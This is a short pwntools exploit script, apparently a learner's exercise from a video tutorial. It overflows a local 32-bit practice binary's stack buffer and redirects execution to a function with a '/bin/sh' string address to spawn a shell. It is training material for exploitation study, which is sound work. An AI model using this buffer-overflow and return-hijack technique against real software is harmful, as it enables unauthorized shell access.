'''
Author: 白银
Date: 2022-08-27 16:55:12
LastEditTime: 2022-08-27 17:03:02
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=17&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=967.2
'''

from pwn import *

context(log_level = 'debug', arch = 'i386', os = 'linux')

pwnfile = './question_4_2_x86'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x14

gdb.attach(io)
pause()

return_addr = elf.symbols['func']
# return_addr = 0x401142

between_thing = 0xdeadbeaf#他俩中间随便写

bin_sh_addr = 0x804C024

payload = flat(['a' * padding, return_addr, between_thing, bin_sh_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload)
io.interactive()